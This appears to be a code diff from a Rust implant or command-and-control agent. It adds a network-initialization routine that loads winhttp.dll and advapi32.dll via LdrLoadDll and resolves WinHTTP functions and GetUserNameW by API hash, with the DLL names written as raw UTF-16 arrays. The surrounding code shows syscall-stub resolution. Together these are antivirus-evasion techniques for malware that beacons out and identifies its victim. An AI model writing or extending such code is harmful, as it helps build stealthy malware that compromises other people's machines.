@@ -4,7 +4,7 @@ use core::ptr::null_mut;
 
 use crate::core::types::{HANDLE, SyscallEntry};
 use crate::core::{hashes, resolver};
-
+use crate::debug;
 
 const RET_OPCODE: u8 = 0xC3;
 const SYSCALL_SEARCH_RANGE: isize = 32;
@@ -332,6 +332,62 @@ pub unsafe fn initialize_syscalls(mut ntdll: *mut c_void) -> bool {
     }
 }
 
+
+pub unsafe fn initialize_network() -> bool {
+    let state = &mut *NATIVE.0.get();
+
+    // Skip if already initialized
+    if !state.modules.winhttp.is_null() {
+        return true;
+    }
+
+    debug!("[NET] LdrLoadDll resolved: {}", !state.win32.ldr_load_dll.is_null());
+
+    // Load winhttp.dll via LdrLoadDll
+    // w\0i\0n\0h\0t\0t\0p\0.\0d\0l\0l\0\0
+    let winhttp_name: [u16; 12] = [
+        0x0077, 0x0069, 0x006E, 0x0068, 0x0074, 0x0074, 
+        0x0070, 0x002E, 0x0064, 0x006C, 0x006C, 0x0000,
+    ];
+    state.modules.winhttp = load_module(hashes::WINHTTP_DLL_HASH, Some(&winhttp_name));
+    debug!("[NET] winhttp.dll loaded: {}", !state.modules.winhttp.is_null());
+    if state.modules.winhttp.is_null() {
+        return false;
+    }
+
+    // Batch resolve all WinHTTP functions in one pass
+    {
+        use core::ptr::addr_of_mut;
+        let p = NATIVE.0.get();
+        let winhttp = (*p).modules.winhttp;
+        let mut batch: [(u32, *mut *mut c_void); 10] = [
+            (hashes::WINHTTPOPEN_HASH, addr_of_mut!((*p).win32.winhttp_open)),
+            (hashes::WINHTTPCONNECT_HASH, addr_of_mut!((*p).win32.winhttp_connect)),
+            (hashes::WINHTTPOPENREQUEST_HASH, addr_of_mut!((*p).win32.winhttp_open_request)),
+            (hashes::WINHTTPSENDREQUEST_HASH, addr_of_mut!((*p).win32.winhttp_send_request)),
+            (hashes::WINHTTPRECEIVERESPONSE_HASH, addr_of_mut!((*p).win32.winhttp_receive_response)),
+            (hashes::WINHTTPREADDATA_HASH, addr_of_mut!((*p).win32.winhttp_read_data)),
+            (hashes::WINHTTPSETOPTION_HASH, addr_of_mut!((*p).win32.winhttp_set_option)),
+            (hashes::WINHTTPCLOSEHANDLE_HASH, addr_of_mut!((*p).win32.winhttp_close_handle)),
+            (hashes::WINHTTPQUERYDATAAVAILABLE_HASH, addr_of_mut!((*p).win32.winhttp_query_data_available)),
+            (hashes::WINHTTPADDREQUESTHEADERS_HASH, addr_of_mut!((*p).win32.winhttp_add_request_headers)),
+        ];
+        resolver::resolve_exports_batch(winhttp, &mut batch);
+    }
+
+    // Load advapi32.dll for GetUserNameW
+    let advapi32_name: [u16; 13] = [
+        0x0061, 0x0064, 0x0076, 0x0061, 0x0070, 0x0069, 0x0033, 
+        0x0032, 0x002E, 0x0064, 0x006C, 0x006C, 0x0000,
+    ];
+    state.modules.advapi32 = load_module(hashes::ADVAPI32_DLL_HASH, Some(&advapi32_name));
+    if !state.modules.advapi32.is_null() {
+        state.win32.get_user_name_w = resolver::ldr_function_by_hash(state.modules.advapi32, hashes::GETUSERNAMEW_HASH);
+    }
+
+    // Verify crucial WinHTTP function resolved
+    !state.win32.winhttp_open.is_null() && !state.win32.winhttp_connect.is_null() && !state.win32.winhttp_send_request.is_null()
+}
 
 /**
  * Resolves or load a module by its hash or name
